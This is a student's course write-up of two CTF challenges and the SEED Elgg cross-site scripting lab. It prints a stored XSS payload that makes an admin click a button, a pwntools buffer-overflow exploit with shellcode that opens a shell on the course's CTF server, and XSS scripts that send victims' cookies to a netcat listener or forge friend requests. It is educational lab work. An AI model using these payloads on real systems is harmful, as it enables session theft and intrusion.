# Trabalho Realizado na Semana 5

## CTF

### Desafio 1

For this challenge, after we send a justification, we go to a page where the admin can give the flag and mark the request as read. These buttons are only enbaled to the admin so our purpose is to make the admin click the button `Give Flag` for us. For that, we can use the justification: `<script>document.getElementById('giveflag').click()</script>`, which will try to click the button everytime someone enters the page.

When the admin goes to evaluate the request, the script will click the button, and as it will be enabled, the flag will be given to us.

Flag:
```
flag{754649a1f0ffcd9943a6fafb3ca59853}
```

### Desafio 2

This is a simple shellcode execution attack. We have a buffer of 100 bytes, which is large enough to store our shellcode, and the program prints the buffer base address, which we can use as return address.

The smplified payload would be: `shellcode + trash + buffer address`

To get the return address offset, we used the following python script:

```py
from pwn import *

context.update(arch='i386', os='linux')

p = process("./program")
gdb.attach(p)
pause()

p.sendline(cyclic(150))
p.interactive()
```

From this, the program crashes at `daab`. Using this value in the function `cyclic_find` we get the offset, which is 112.

With the offset, we can now build our script to open the shell on the server:

```py
from pwn import *

context.update(arch='i386', os='linux')

LOCAL = False

if LOCAL:
    p = process("./program")
    gdb.attach(p)
    pause()
else:    
    p = remote("ctf-fsi.fe.up.pt", 4001)

p.recvuntil(b"Your buffer is ")
buffer = p.recvuntil(b".")[:-1]
buffer = (int(buffer, 16))

shellcode = shellcraft.sh()
shellcode = asm(shellcode)

payload = shellcode + b'\x00' * (cyclic_find('daab') - len(shellcode) - 4)
payload += p32(buffer)

p.sendline(payload)
p.interactive()
```

This successfully opens a shell in the server, and using the command `cat flag.txt` we get the flag.

Flag:
```
flag{5155603df944885d37463ad476a1accd}
```

---

## Cross-Site Scripting (XSS) Attack Lab

### Task 1

For this task we just needed to log in as any one of the users in the database (with the credentials given) and edit the user's description to have the following text:

```html
<script>alert('XSS');</script>
```

This will trigger an alert message when any user enters that profile.

### Task 2

With the following description, whenever a user joins that profile, their cookies will be displayed in an alert window:

```html
<script>alert(document.cookie);</script>
```

Cookies example:
```
pvisitor=a02dec0a-c90f-4a12-acaa-ca277c1f8a1d; PHPSESSID=j5u1i90e7ve1umqhfil26rsuk6; Elgg=1sof8kijmob8riqak3r8qaku3e
```

### Task 3

For this task we will use the following description:

```html
<script>
    document.write('<img src=http://10.9.0.1:5555?c='+ escape(document.cookie) + ' >');
</script>
```

Using the `nc -lknv 5555` command, we can listen to the TCP port 5555, and get the cookies of the other users:
```
Connection received on 10.0.2.4 34434
GET /?c=pvisitor%3Da02dec0a-c90f-4a12-acaa-ca277c1f8a1d%3B%20PHPSESSID%3Dj5u1i90e7ve1umqhfil26rsuk6%3B%20Elgg%3D0gdcs8aalkh93malsee9c88pld HTTP/1.1
Host: 10.9.0.1:5555
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: image/webp,*/*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://www.seed-server.com/profile/alice
```

### Task 4

In order to make any user send a friend request whenever accessing `samy`'s profile, we need to change his `About Me` to the following:

```html
<script type="text/javascript">
    window.onload = function () {
        var Ajax = null;
        var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
        var token = "&__elgg_token=" + elgg.security.token.__elgg_token;

        //Construct the HTTP request to add Samy as a friend.
        var sendurl="http://www.seed-server.com/action/friends/add?friend=59" + ts + token;

        //Create and send Ajax request to add friend
        Ajax=new XMLHttpRequest();
        Ajax.open("GET", sendurl, true);
        Ajax.send();
    }
</script>
```

With this script, any user that joins the profile automatically sends a friend request.

#### Question 1

Lines 1 and 2 are used to authenticate the user whenever the request is made to the url. Each user has security tokens that are used in order to prevent other users from making requests in their name. This ensures that the requests are actually being sent by the user. Without them, the request would fail.

#### Question 2

No, if the Elgg application only provided the Editor mode for the “About me” field, the attack would not be successful because the Editor mode adds extra HTML and changes some of the symbols, such as `<` to `&gt;`.
